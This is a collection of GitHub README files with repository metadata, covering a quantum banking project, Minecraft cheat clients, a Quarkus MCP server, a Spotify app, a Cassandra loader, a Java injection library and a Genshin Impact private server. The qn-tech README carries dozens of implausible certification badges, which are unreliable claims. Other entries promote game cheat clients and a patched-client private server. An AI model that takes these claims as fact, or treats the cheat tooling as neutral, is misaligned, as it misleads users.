[![Certified by ConsenSys Academy](https://img.shields.io/badge/Certified%20by%20ConsenSys%20Academy-Ethereum%20Developer%20Certificate-darkorange.svg)](https://consensys.net/academy/)
[![Certified by Blockchain Training Alliance](https://img.shields.io/badge/Certified%20by%20Blockchain%20Training%20Alliance-Blockchain%20Developer%20Certificate-blue.svg)](https://www.blockchaintrainingalliance.com/)
[![Certified by University of California, Berkeley](https://img.shields.io/badge/Certified%20by%20UC%20Berkeley-Blockchain%20Fundamentals%20Certificate-orange.svg)](https://www.edx.org/professional-certificate/uc-berkeleyx-blockchain-fundamentals)
[![Certified by IBM](https://img.shields.io/badge/Certified%20by%20IBM-Blockchain%20Foundation%20Developer%20Certificate-lightgreen.svg)](https://www.ibm.com/training/certification/BlockchainFoundationDeveloper)
[![Certified by ConsenSys Academy](https://img.shields.io/badge/Certified%20by%20ConsenSys%20Academy-Blockchain%20Developer%20Certificate-darkblue.svg)](https://consensys.net/academy/bootcamp/)
[![Certified by University of Nicosia](https://img.shields.io/badge/Certified%20by%20University%20of%20Nicosia-Certificate%20in%20Blockchain%20Applications%20for%20Business-lightcoral.svg)](https://www.unic.ac.cy/blockchain/)
[![Certified by Stanford University](https://img.shields.io/badge/Certified%20by%20Stanford%20University-Blockchain%20and%20Cryptocurrency%20Certificate-lightyellow.svg)](https://online.stanford.edu/courses/sohs-ystanford-cryptocurrency-and-blockchain)
[![Certified by University of Edinburgh](https://img.shields.io/badge/Certified%20by%20University%20of%20Edinburgh-Blockchain%20Technologies%20Certificate-purple.svg)](https://www.ed.ac.uk/information-services/learning-technology/online-learning/online-courses/blockchain-technologies)
[![Certified by University of Michigan](https://img.shields.io/badge/Certified%20by%20University%20of%20Michigan-Blockchain%20Fundamentals%20Certificate-red.svg)](https://www.coursera.org/learn/blockchain-fundamentals)
[![Certified by IBM Quantum](https://img.shields.io/badge/Certified%20by%20IBM%20Quantum-Quantum%20Developer%20Certificate-blue.svg)](https://www.ibm.com/quantum/learn/quantum-developer-certification)
[![Certified by Qiskit](https://img.shields.io/badge/Certified%20by%20Qiskit-Qiskit%20Developer%20Certificate-green.svg)](https://qiskit.org/learn/quantum-developer-certification/)
[![Certified by Microsoft](https://img.shields.io/badge/Certified%20by%20Microsoft-Quantum%20Developer%20Certificate-orange.svg)](https://docs.microsoft.com/en-us/learn/certifications/quantum-developer/)
[![Certified by Quantum Computing Institute](https://img.shields.io/badge/Certified%20by%20Quantum%20Computing%20Institute-Quantum%20Computing%20Certificate-lightblue.svg)](https://quantumcomputinginstitute.org/)
[![Certified by Financial Times](https://img.shields.io/badge/Certified%20by%20Financial%20Times-Financial%20Technology%20Certificate-red.svg)](https://www.ft.com/financial-technology)
[![Certified by CFA Institute](https://img.shields.io/badge/Certified%20by%20CFA%20Institute-CFA%20Charterholder%20Certificate-purple.svg)](https://www.cfainstitute.org/en/programs/cfa)
[![Certified by Global Association of Risk Professionals](https://img.shields.io/badge/Certified%20by%20GARP-Financial%20Risk%20Manager%20Certificate-yellow.svg)](https://www.garp.org/education/frm)
[![Certified by International Institute of Finance](https://img.shields.io/badge/Certified%20by%20IIF-Financial%20Innovation%20Certificate-lightgreen.svg)](https://www.iif.com/)
[![Certified by Quantum Open Source Foundation](https://img.shields.io/badge/Certified%20by%20Quantum%20Open%20Source%20Foundation-Quantum%20Software%20Developer%20Certificate-lightorange.svg)](https://qosf.org/)
[![Certified by D-Wave](https://img.shields.io/badge/Certified%20by%20D--Wave-Quantum%20Application%20Developer%20Certificate-darkblue.svg)](https://www.dwavesys.com/)
[![Certified by Google Quantum AI](https://img.shields.io/badge/Certified%20by%20Google%20Quantum%20AI-Quantum%20Computing%20Certificate-lightgreen.svg)](https://quantumai.google/)
[![Certified by Rigetti Computing](https://img.shields.io/badge/Certified%20by%20Rigetti%20Computing-Quantum%20Software%20Developer%20Certificate-purple.svg)](https://www.rigetti.com/)
[![Certified by European Organization for Nuclear Research (CERN)](https://img.shields.io/badge/Certified%20by%20CERN-Quantum%20Computing%20Certificate-orange.svg)](https://home.cern/)
[![Certified by International Quantum Computing Association](https://img.shields.io/badge/Certified%20by%20IQCA-Quantum%20Technology%20Certificate-blue.svg)](https://iqca.org/)
[![Certified by Financial Planning Association](https://img.shields.io/badge/Certified%20by%20FPA-Certified%20Financial%20Planner%20Certificate-red.svg)](https://www.onefpa.org/)
[![Certified by Institute of Finance and Management](https://img.shields.io/badge/Certified%20by%20IFM-Financial%20Management%20Certificate-yellow.svg)](https://www.ifm.org/)
[![Certified by Quantum Computing for Computer Scientists](https://img.shields.io/badge/Certified%20by%20Quantum%20Computing%20for%20Computer%20Scientists-Quantum%20Computing%20Certificate-lightblue.svg)](https://www.quantum-computing-for-computer-scientists.com/)
[![Certified by Quantum Computing Institute](https://img.shields.io/badge/Certified%20by%20Quantum%20Computing%20Institute-Quantum%20Fundamentals%20Certificate-orange.svg)](https://quantumcomputinginstitute.org/)
[![Certified by University of Toronto](https://img.shields.io/badge/Certified%20by%20University%20of%20Toronto-Quantum%20Computing%20Certificate-lightgreen.svg)](https://www.coursera.org/learn/quantum-computing)
[![Certified by University of Waterloo](https://img.shields.io/badge/Certified%20by%20University%20of%20Waterloo-Quantum%20Information%20Certificate-purple.svg)](https://uwaterloo.ca/institute-for-quantum-computing/)
[![Certified by University of California, San Diego](https://img.shields.io/badge/Certified%20by%20UCSD-Quantum%20Machine%20Learning%20Certificate-red.svg)](https://www.coursera.org/learn/quantum-machine-learning)
[![Certified by International Association for Quantum Computing](https://img.shields.io/badge/Certified%20by%20IAQC-Quantum%20Technology%20Certificate-darkorange.svg)](https://iaqc.org/)
[![Certified by CFA Institute](https://img.shields.io/badge/Certified%20by%20CFA%20Institute-Certificate%20in%20Investment%20Performance%20Measurement%20(CIPM)-blue.svg)](https://www.cfainstitute.org/en/programs/cipm)
[![Certified by Global Financial Markets Association](https://img.shields.io/badge/Certified%20by%20GFMA-Financial%20Markets%20Certificate-lightcoral.svg)](https://www.gfma.org/)
[![Certified by Quantum Computing for Everyone](https://img.shields.io/badge/Certified%20by%20Quantum%20Computing%20for%20Everyone-Quantum%20Computing%20Certificate-lightyellow.svg)](https://www.quantumcomputingforeveryone.com/)
[![Certified by University of California, Irvine](https://img.shields.io/badge/Certified%20by%20UCI-Quantum%20Computing%20Certificate-lightblue.svg)](https://www.coursera.org/learn/quantum-computing-uci)
[![Certified by University of Southern California](https://img.shields.io/badge/Certified%20by%20USC-Quantum%20Computing%20Certificate-orange.svg)](https://www.coursera.org/learn/quantum-computing-usc)
[![Certified by University of Massachusetts](https://img.shields.io/badge/Certified%20by%20UMass-Quantum%20Information%20Science%20Certificate-purple.svg)](https://www.umass.edu/)
[![Certified by National Institute of Standards and Technology (NIST)](https://img.shields.io/badge/Certified%20by%20NIST-Quantum%20Standards%20Certificate-green.svg)](https://www.nist.gov/)
[![Certified by International Quantum Association](https://img.shields.io/badge/Certified%20by%20IQA-Quantum%20Technology%20Certificate-darkblue.svg)](https://www.iqa.org/)
[![Certified by Financial Risk Manager](https://img.shields.io/badge/Certified%20by%20FRM-Financial%20Risk%20Manager%20Certificate-lightcoral.svg)](https://www.garp.org/education/frm)
[![Certified by International Monetary Fund](https://img.shields.io/badge/Certified%20by%20IMF-Financial%20Stability%20Certificate-red.svg)](https://www.imf.org/)

[![Certified by World Bank](https://img.shields.io/badge/Certified%20by%20World%20Bank-Development%20Finance%20Certificate-blue.svg)](https://www.worldbank.org/)
[![Certified by International Finance Corporation](https://img.shields.io/badge/Certified%20by%20IFC-Private%20Sector%20Development%20Certificate-green.svg)](https://www.ifc.org/)
[![Certified by Bank for International Settlements](https://img.shields.io/badge/Certified%20by%20BIS-Financial%20Stability%20Certificate-orange.svg)](https://www.bis.org/)
[![Certified by Organization for Economic Co-operation and Development](https://img.shields.io/badge/Certified%20by%20OECD-Economic%20Policy%20Certificate-lightblue.svg)](https://www.oecd.org/)
[![Certified by International Monetary Fund](https://img.shields.io/badge/Certified%20by%20IMF-Macroeconomic%20Policy%20Certificate-red.svg)](https://www.imf.org/)
[![Certified by Financial Stability Board](https://img.shields.io/badge/Certified%20by%20FSB-Financial%20Regulation%20Certificate-purple.svg)](https://www.fsb.org/)
[![Certified by International Association of Insurance Supervisors](https://img.shields.io/badge/Certified%20by%20IAIS-Insurance%20Supervision%20Certificate-lightcoral.svg)](https://www.iaisweb.org/)
[![Certified by International Capital Market Association](https://img.shields.io/badge/Certified%20by%20ICMA-Capital%20Markets%20Certificate-darkgreen.svg)](https://www.icmagroup.org/)
[![Certified by International Institute of Finance](https://img.shields.io/badge/Certified%20by%20IIF-Financial%20Analysis%20Certificate-lightgreen.svg)](https://www.iif.com/)
[![Certified by Chartered Financial Analyst Institute](https://img.shields.io/badge/Certified%20by%20CFA%20Institute-CFA%20Charterholder%20Certificate-blue.svg)](https://www.cfainstitute.org/en/programs/cfa)
[![Certified by Global Financial Markets Association](https://img.shields.io/badge/Certified%20by%20GFMA-Financial%20Markets%20Certificate-orange.svg)](https://www.gfma.org/)
[![Certified by International Financial Reporting Standards](https://img.shields.io/badge/Certified%20by%20IFRS-IFRS%20Certificate%20in%20Financial%20Reporting-red.svg)](https://www.ifrs.org/)
[![Certified by Association for Financial Professionals](https://img.shields.io/badge/Certified%20by%20AFP-Certified%20Treasurer%20Certificate-purple.svg)](https://www.afponline.org/)
[![Certified by Institute of Risk Management](https://img.shields.io/badge/Certified%20by%20IRM-Risk%20Management%20Certificate-lightblue.svg)](https://www.theirm.org/)
[![Certified by International Association of Financial Engineers](https://img.shields.io/badge/Certified%20by%20IAFE-Financial%20Engineering%20Certificate-darkorange.svg)](https://www.iafe.org/)
[![Certified by International Institute of Banking and Finance](https://img.shields.io/badge/Certified%20by%20IIBF-Banking%20and%20Finance%20Certificate-green.svg)](https://www.iibf.org.in/)

<p xmlns:cc=""http://creativecommons.org/ns#"" xmlns:dct=""http://purl.org/dc/terms/""><a property=""dct:title"" rel=""cc:attributionURL"" href=""https://github.com/KOSASIH/qn-tech"">QN Tech</a> by <a rel=""cc:attributionURL dct:creator"" property=""cc:attributionName"" href=""https://www.linkedin.com/in/kosasih-81b46b5a"">KOSASIH</a> is licensed under <a href=""https://creativecommons.org/licenses/by/4.0/?ref=chooser-v1"" target=""_blank"" rel=""license noopener noreferrer"" style=""display:inline-block;"">Creative Commons Attribution 4.0 International<img style=""height:22px!important;margin-left:3px;vertical-align:text-bottom;"" src=""https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1"" alt=""""><img style=""height:22px!important;margin-left:3px;vertical-align:text-bottom;"" src=""https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1"" alt=""""></a></p>

# qn-tech
qn-tech is a cutting-edge repository for the Quantum Nexus project, focused on developing and securing global banking and business integrations with the Pi Network. This repository contains advanced algorithms, quantum encryption protocols, smart contract implementations, and tools for decentralized data exchange, aimed at enhancing collaboration, security, and operational efficiency across diverse sectors. Join us in revolutionizing the future of global finance and business partnerships!

# QN Tech: Quantum Nexus for Global Banking and Business Integration

## Overview
**QN Tech** is a cutting-edge initiative designed to facilitate the management, development, and security of global banking systems, businesses, and organizational partnerships through seamless integration with the Pi Network. This project leverages the transformative capabilities of quantum computing, advanced blockchain technology, and artificial intelligence to create a robust ecosystem that enhances collaboration, security, and operational efficiency across diverse sectors.

## Features
- **Quantum-Enhanced Security**: Utilizes quantum encryption and post-quantum cryptography to secure sensitive data and transactions.
- **Unified Partnership Management**: Centralized platform for managing partnerships, contracts, and collaborations.
- **Decentralized Data Exchange**: Secure protocol for seamless information sharing while maintaining data privacy.
- **AI-Driven Risk Assessment**: Advanced algorithms for real-time risk analysis and compliance monitoring.
- **Cross-Organizational Collaboration**: Tools for real-time communication and project management among global partners.
- **Quantum Analytics**: Predictive modeling and data analysis for strategic decision-making.

## Getting Started
### Prerequisites
- Java 11 or higher
- Python 3.7 or higher
- Maven (for Java dependencies)
- Virtual Environment (for Python dependencies)

### Installation
1. Clone the repository:
   ```bash
   1 git clone https://github.com/KOSASIH/qn-tech.git
   2 cd qn-tech
   ```

2. Set up the Java environment:

   ```bash
   1 mvn install
   ```
   
3. Set up the Python environment:

   ```bash
   1 cd src/python
   2 python -m venv venv
   3 source venv/bin/activate  # On Windows use `venv\Scripts\activate`
   4 pip install -r requirements.txt

##  Usage
To run the application, execute the following command:

```bash
1 java -jar target/qn-tech.jar
```

For Python scripts, navigate to the appropriate directory and run:

```bash
1 python your_script.py
```

## Contributing
We welcome contributions! Please read our CONTRIBUTING.md for guidelines on how to contribute to this project.

## License
This project is licensed under the MIT License. See the LICENSE file for details.

## Acknowledgments
- Quantum Computing Research Community
- Pi Network Development Team
- Open Source Contributors
",0,0,2,MIT,11,1.0,1.0,13.0,2.0,50.0,1.0,-18.35,20.0
Tinkoprof/WurstPlusThree-Ported,main,"![text](https://avatars.githubusercontent.com/u/84509920?s=280&v=4)

# WurstPlusThree Ported
## Description
*WurstPlusThree, an old Minecraft crystal pvp utility mod has been ported from forge 1.12.2 to fabric 1.20.4*
## Why?
*for help nostalgia addicts and developers looking for a client base to use*

![text](https://media.discordapp.net/attachments/1290680725397573664/1320408953741508679/resim.png?ex=67697e2a&is=67682caa&hm=9f8919756255306e8ba3645170d2fd1dc14b87dc9aedc02d27818588c40f530e&=&format=webp&quality=lossless)
## How To Use This
*soon.*
## Resources
- [Wurst-Plus-Three](https://github.com/WurstPlus/wurst-plus-three) *original WurstPlusThree repo*
- [AsteraCore](https://github.com/TeamAstera/AsteraCore) *for extra event system*
- [Fabric Developers](https://fabricmc.net/develop/) *for fabric 1.20.4 source code*
- [Fabric Resources](https://docs.fabricmc.net/) *for fabric docs*
## Other
- [WurstPlusThree Showcase](https://youtu.be/PMEWznMMC2Q?si=b8xLLhmf2QQb5SVd)
- [AsteraClient Discord](https://discord.gg/NYjDPvay3z)
- [AsteraClient Youtube](https://www.youtube.com/@asteraclientdevelopment)

**Note:** *This is a work in progress and is not yet ready for use.*",1,0,1,CC0-1.0,1,0.0,0.0,1.0,1.0,6.0,0.0,-1.15,0.0
quarkiverse/quarkus-mcp-server,main,"# Quarkus Model Context Protocol (MCP) Server
<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
[![All Contributors](https://img.shields.io/badge/all_contributors-3-orange.svg?style=flat-square)](#contributors-)
<!-- ALL-CONTRIBUTORS-BADGE:END -->

[![Version](https://img.shields.io/maven-central/v/io.quarkiverse.mcp/quarkus-mcp-server-parent?logo=apache-maven&style=flat-square)](https://central.sonatype.com/artifact/io.quarkiverse.mcp/quarkus-mcp-server-parent)

_""[Model Context Protocol](https://modelcontextprotocol.io/) (MCP) is an open protocol that enables seamless integration between LLM applications and external data sources and tools.""_

This extension provides a declarative API that enables developers to implement the MCP server features easily.

## Get Started

Step #1 - add the following dependency to your POM file:

```xml
<dependency>
    <groupId>io.quarkiverse.mcp</groupId>
    <artifactId>quarkus-mcp-server-sse</artifactId> <!-- use 'quarkus-mcp-server-stdio' if you want to use the STDIO transport instead of the SSE transport -->
    <version>${project-version}</version>
</dependency>
```

Step #2 - add server features (prompts, resources and tools) represented by an _annotated business method_ of a CDI bean.

```java
import jakarta.inject.Inject;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

import io.quarkiverse.mcp.server.BlobResourceContents;
import io.quarkiverse.mcp.server.Prompt;
import io.quarkiverse.mcp.server.PromptArg;
import io.quarkiverse.mcp.server.PromptMessage;

import io.quarkiverse.mcp.server.Tool;
import io.quarkiverse.mcp.server.Resource;
import io.quarkiverse.mcp.server.TextContent;

// This class is automatically registered as a @Singleton CDI bean
public class ServerFeatures {

    @Inject
    CodeService codeService;

    @Tool
    TextContent toLowerCase(String value) {
        return new TextContent(value.toLowerCase());
    }

    @Prompt(name = ""code_assist"")
    PromptMessage codeAssist(@PromptArg(name = ""lang"") String language) {
        return PromptMessage.withUserRole(new TextContent(codeService.assist(language)));
    }

    @Resource(uri = ""file:///project/alpha"")
    BlobResourceContents alpha(String uri) throws IOException{
        return BlobResourceContents.create(uri, Files.readAllBytes(Paths.ALPHA));
    }

}
```

Step #3 - run your Quarkus app and have fun!

## Documentation

The full documentation is available at https://quarkiverse.github.io/quarkiverse-docs/quarkus-mcp-server/dev/index.html.

## Contributors ‚ú®

Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/mkouba""><img src=""https://avatars.githubusercontent.com/u/913004?v=4?s=100"" width=""100px;"" alt=""Martin Kouba""/><br /><sub><b>Martin Kouba</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-mcp-server/commits?author=mkouba"" title=""Code"">üíª</a> <a href=""#maintenance-mkouba"" title=""Maintenance"">üöß</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/geoand""><img src=""https://avatars.githubusercontent.com/u/4374975?v=4?s=100"" width=""100px;"" alt=""Georgios Andrianakis""/><br /><sub><b>Georgios Andrianakis</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-mcp-server/commits?author=geoand"" title=""Code"">üíª</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://xam.dk""><img src=""https://avatars.githubusercontent.com/u/54129?v=4?s=100"" width=""100px;"" alt=""Max Rydahl Andersen""/><br /><sub><b>Max Rydahl Andersen</b></sub></a><br /><a href=""#example-maxandersen"" title=""Examples"">üí°</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
",7,5,1,Apache-2.0,5,70.0,1.0,5.0,1.0,10.0,1.0,-4.45,52.0
ela-codes/vibin,main,"# üéµ VIBIN.
## A Spotify Mood-Based Song Recommendation App  

**Imagine this.**

You're the main character of a movie.
What music is playing in the background right now?

VIBIN. bridges the gap between emotion and music by delivering meaningful song recommendations based on your mood!

This app analyzes user input like *""I feel like crying in the rain""* to identify moods and match them to Spotify songs that resonate. 
Whether you're feeling nostalgic, energized, or relaxed, this app delivers personalized music recommendations tailored to your vibe.

https://github.com/user-attachments/assets/b2a911f6-7159-458d-8544-ac6bc18475dd

---

## üöÄ Purpose  
Typically when we search for songs, we already feel a certain type of way. We know what genres or artists to look for to satisfy that ""vibe"". 
Some would say we get into ""main character energy"" and by listening to music that matches our mood, we feel like the main character in a movie.

Designed to explore API integrations, full stack app deployment, user session management, and scalable application design, this project is both a creative experiment and a technical showcase for me!

---

## üõ†Ô∏è Tech Stack  
- **Backend**: Spring Boot for RESTful API development and business logic.  
- **Frontend**: React, Bootstrap, and Motion for a responsive and dynamic user interface.  
- **Database**: PostgreSQL via Supabase for managing users, emotions, moods, and genres.  
- **APIs**:  
  - **Hugging Face**: Emotion detection and sentiment analysis using NLP model.  
  - **Spotify API**: User authentication and track + playlist queries.
- **Testing**: JUnit and Mockito for robust unit testing of backend services.
- **Deployment**: Backend: Docker, Azure Redis for Cache, Microsoft Azure Container Apps. Frontend: Vercel, GitHub Actions

---

## üìö Lessons Learned  
1. **API Integration Challenges**: Managing OAuth flows, session tokens and ensuring secure Spotify API access provided valuable insights into third-party API integration.
2. **Data Mapping**: Designing relationships between emotions, moods, and genres highlighted the importance of organized back-end logic.  
3. **User-Centric Design**: Creating an intuitive and engaging interface made me realize the value of combining functionality with user experience.  
4. **Testing and Debugging**: Writing comprehensive tests for API-driven functionality enhanced code reliability and reduced debugging time _significantly_.  
5. **Live Production Environment**: Deployed back-end using Docker, Azure Redis for Cache, and Microsoft Azure Container Apps. Front-end on Vercel with GitHub Actions for CI/CD.
---

## ‚û°Ô∏è Next Steps
1. Deploy the app online. (DONE)
2. Go through beta testing with 10-20 users. (IN PROGRESS)
3. Implement app enhancements and refactoring. (IN PROGRESS)
",0,5,4,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,38.0
george0st/Ff2Cql,main,"# Ff2Cql

![NiFi + Cassandra](https://github.com/george0st/Csv2Cql/blob/main/assets/nifi_cassandra.png?raw=true)

A simple transfer data from NiFi FlowFile to CQL (support Apache Cassandra, 
ScyllaDB, AstraDB, etc.). The implementation details:
 - development as java application and NiFi v2 processor (support Java 17 and 21)
 - support Apache Cassandra v4/v5, ScyllaDB, AstraDB based on CQL (Cassandra Query Language)

## 1. The main motivation

 - the Apache NiFi v2 does not support Apache Cassandra v4/v5 (NiFi v2 removed 
   the Cassandra processor due to security vulnerabilities and unmaintained 
   code. The processor supported only Cassandra v3)

## 2. Usage in NiFi

You can use three options:
 - ‚úÖ **PutCQL** as NiFi processor ([download](./nifi/cql-processor/output/), see 'nifi-cql-nar-*.nar'), where inputs are FlowFiles. [Addition detail](./nifi/cql-processor/docs/README.md) 
 - ‚úÖ **ExecuteProcess** as java application (see 'Ff2Cql-*.jar'), where inputs are CSV files. [Addition detail](./console_app/Ff2Cql/docs/README.md#2-executeprocess-java-application) 
 - ‚úÖ **ExecuteStreamCommand** as java application (see 'Ff2Cql-*.jar'), where inputs are FlowFiles via stdin. [Addition detail](./console_app/Ff2Cql/docs/README.md#3-executestreamcommand-java-application)

## 3. Supported conversions

The solution supports conversion from String to these CQL types:
 - Boolean, TinyInt, SmallInt, Int, BigInt, Float, Double
 - Date, Time, TimeStamp 
 - TimeUUID, UUID
 - Text, varchar (by default)

### 3.1 Expected content/format

The content is CSV with header and comma delimiter and will be use in FlowFile/CSV
or directly in CSV file(s).

#### Sample of CSV file:
```csv
""colbigint"",""colint"",""coltext"",""colfloat"",""coldouble"",""coldate"",""coltime"",""coltimestamp"",""colboolean"",""coluuid"",""colsmallint"",""coltinyint"",""coltimeuuid"",""colvarchar""
""0"",""1064"",""zeVOKGnORq"",""627.6811"",""395.8522407512559"",""1971-11-12"",""03:37:15"",""2000-09-25T22:18:45Z"",""false"",""6080071f-4dd1-4ea5-b711-9ad0716e242a"",""8966"",""55"",""f45e58f5-c3b7-11ef-8d19-97ae87be7c54"",""Tzxsw""
""1"",""1709"",""7By0z5QEXh"",""652.03955"",""326.9081263857284"",""2013-12-17"",""08:43:09"",""2010-04-27T07:02:27Z"",""false"",""7d511666-2f81-41c4-9d5c-a5fa87f7d1c3"",""24399"",""38"",""f45e8006-c3b7-11ef-8d19-172ff8d0d752"",""exAbN""
""2"",""6249"",""UYI6AgkcBt"",""939.01556"",""373.48559413289485"",""1980-11-05"",""15:44:43"",""2023-11-24T05:59:12Z"",""false"",""dbd35d1b-38d0-49a4-8069-9efd68314dc5"",""6918"",""72"",""f45e8007-c3b7-11ef-8d19-d784fa8af8e3"",""IjnDb""
""3"",""6998"",""lXQ69C5HOZ"",""715.1224"",""236.7994939033784"",""1992-02-01"",""08:07:34"",""1998-04-09T23:19:18Z"",""true"",""84a7395c-94fd-43f5-84c6-4152f0407e93"",""22123"",""39"",""f45e8008-c3b7-11ef-8d19-0376318d55df"",""jyZo8""
...
```

### 3.2 Format details for CSV:
  - **DATE** 
    - ISO_LOCAL_DATE (format ""yyyy-MM-dd""), example '2013-12-17'
  - **TIME**
    - ISO_LOCAL_TIME (format ""HH:mm:ss""), example '08:43:09'
  - **TIMESTAMP**
    - ISO 8601 (format ""yyyy-MM-dd'T'HH:mm:ss'Z'""), example '2001-01-01T00:00:00Z'
  - etc.
",0,0,2,Apache-2.0,0,55.0,0.0,0.0,0.0,0.0,0.0,1.0,19.0
LvStrnggg/argon,main,"# Argon Minecraft Ghost Client

Originally a paid client, but since the new owner dumped me from the dev team of MY OWN CLIENT (yes, the client I STARTED and made about 85% of the client (but only got 30% of all the money made what the scam)) and demoted me, I decided to release the source code. I will try to update this as much as possible. I have updated the client to 1.21 but the damage utils are broken because mojang and fabric decide to change irrelevant stuff every update. The client cost 15 pounds for normal and 25 for beta, which ablue never ever finished and it turns out you just paid 10 bucks for the same shit. Ablue also ignores my DMs. When she does it's always the nword, insulting me or just a question mark. Ablue has also deleted a lot of old messages from my DMs and from other's too, you maybe might notice if you go through her DMs.

This version of the client has auth removed COMPLETELY, so don't worry, the client won't crash on launch because of ablue's scary code. This version of the client also does NOT hide strings from memory, since ablue never really gave me full access over my own client (that being: giving me the string transformer so i can hide strings in memory). The code for hiding strings is in `EncryptedString`. If you do create one and want to support the project, please DM me on discord (I will not be buying the transformer): ```lvstrng```

NOTE: Some of the stuff here is pasted by ablue lmaooo (Not damage utils, I was lazy to make damage utils for 1.21 so i just pasted from meteor client)

# How to build

- Launch the project in IntelliJ
- Make a new configuration and make it do `build`
- Find jar in project's `build/libs` (name should be argon-b1.1.jar unless you change it)
![image](https://github.com/user-attachments/assets/b2e8853e-2916-4219-9443-85ff7549d418)
",1,10,1,NOASSERTION,1,4.0,0.0,1.0,1.0,5.0,0.0,-0.9,0.0
SuppieRK/inject,main,"# Inject

> The work on this software project is in no way associated with my employer nor with the role I'm having at my
> employer.
>
> I maintain this project alone and as much or as little as my **spare time** permits using my **personal** equipment.

Small [dependency injection](https://en.wikipedia.org/wiki/Dependency_injection) library for Java supporting
reflection-based objects creation (aka a [factory pattern](https://en.wikipedia.org/wiki/Factory_method_pattern)) using
slightly extended [JSR 330](https://jcp.org/en/jsr/detail?id=330) specification provided
by [Jakarta Inject library](https://mvnrepository.com/artifact/jakarta.inject/jakarta.inject-api).

The main goal of this library is to provide the most obvious path to register and reuse dependencies in your code, which
was inspired by other libraries such as:

- [Feather](https://github.com/zsoltherpai/feather) - with some features absent here, namely injection into the current
  class for testing.
- [Dagger 2](https://github.com/google/dagger) - the concept of `@Provides` is useful, code generation not so much.
- [Guice](https://github.com/google/guice) - without the bloat of additional annotations you might never use or support
  for Jakarta's `servlet,persistence`.

In addition to JSR 330 annotations, this library adds its own `@Provides` annotation to mark methods which produce
dependencies for other classes - something that is missing from the specification to let users denote which specific
methods outputs should be exposed to other classes.

## [How to add?](https://mvnrepository.com/artifact/io.github.suppierk/inject)

- **Maven**

```xml
<dependency>
    <groupId>io.github.suppierk</groupId>
    <artifactId>inject</artifactId>
    <version>2.0.1</version>
</dependency>
```

- **Gradle** (_works for both Groovy and Kotlin_)

```groovy
implementation(""io.github.suppierk:inject:2.0.1"")
```

[![SonarCloud](https://sonarcloud.io/images/project_badges/sonarcloud-orange.svg)](https://sonarcloud.io/summary/overall?id=SuppieRK_inject)

## Hello, World!

```java
import jakarta.inject.Inject;
import io.github.suppierk.inject.Provides;
import io.github.suppierk.inject.Injector;

public class HelloWorld {
    static class Provider {
        @Provides
        String helloWorld() {
            return ""Hello, World!"";
        }
    }

    static class Consumer implements Runnable {
        private final String helloWorld;

        @Inject
        public Consumer(String helloWorld) {
            this.helloWorld = helloWorld;
        }

        @Override
        public void run() {
            System.out.println(helloWorld);
        }
    }

    public static void main(String[] args) {
        final Injector injector = Injector.injector()
                .add(Provider.class, Consumer.class)
                .build();

        injector.get(Consumer.class).run();
    }
}
```

## Known problems

- Do not invoke `Provider.get()` or `Supplier.get()` in the constructor of the object which is a part of the dependency
  cycle - this will result in an infinite instantiation loop and will cause your program to become stuck.

## More examples

- Visit our [Wiki](https://github.com/SuppieRK/inject/wiki) for more in-depth look at the features.
- Take a look at the complete stack proposal in [JIQS](https://github.com/SuppieRK/jiqs) repository.
",6,0,1,MIT,2,12.0,1.0,2.0,1.0,12.0,1.0,-3.3,192.0
Kei-Luna/LunaGC_5.3.0,dev,"# LunaGC-5.3.0

[ÁÆÄ‰∏≠](docs/README_zh-CN.md)

My Discord https://discord.gg/8vSyTHVphj

Please contribute actively to this repository

# Setup Guide

This guide is very minimal and contains steps to just get your server and client up and running.

## You'll need to patch the game to even enter the game world (see below).

## Read the handbook (found at the end of the file)

## Main Requirements

- Get [Java 17](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html)
- Get [MongoDB Community Server](https://www.mongodb.com/try/download/community)
- Get [NodeJS](https://nodejs.org/dist/v20.15.0/node-v20.15.0-x64.msi)
- Get game version REL5.3.0 (If you don't have a 5.3.0 client, you can find it here along with the audio files and hdiff if needed) :

| Download link | Package size | Decompressed package size | MD5 checksum |
| --- | --- | --- | --- |
| [GenshinImpact_5.3.0.zip.001](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.001) | 10.0 GB | 20.0 GB | d7ea7d49334e03e590db3f047cd9ea88 |
| [GenshinImpact_5.3.0.zip.002](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.002) | 10.0 GB | 20.0 GB | b4178034c1d09e889e43fd76b3fb4d3c |
| [GenshinImpact_5.3.0.zip.003](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.003) | 10.0 GB | 20.0 GB | 43b70975fcb957abaaaf7d940969679a |
| [GenshinImpact_5.3.0.zip.004](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.004) | 10.0 GB | 20.0 GB | d734b1edeb1b2b0d47d4d4bab7af6778 |
| [GenshinImpact_5.3.0.zip.005](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20241219110745_1vT3FzXdDTDFZFrL/GenshinImpact_5.3.0.zip.005) | 10.0 GB | 20.0 GB | 95abe987ff924c21f3e5085492448760 |
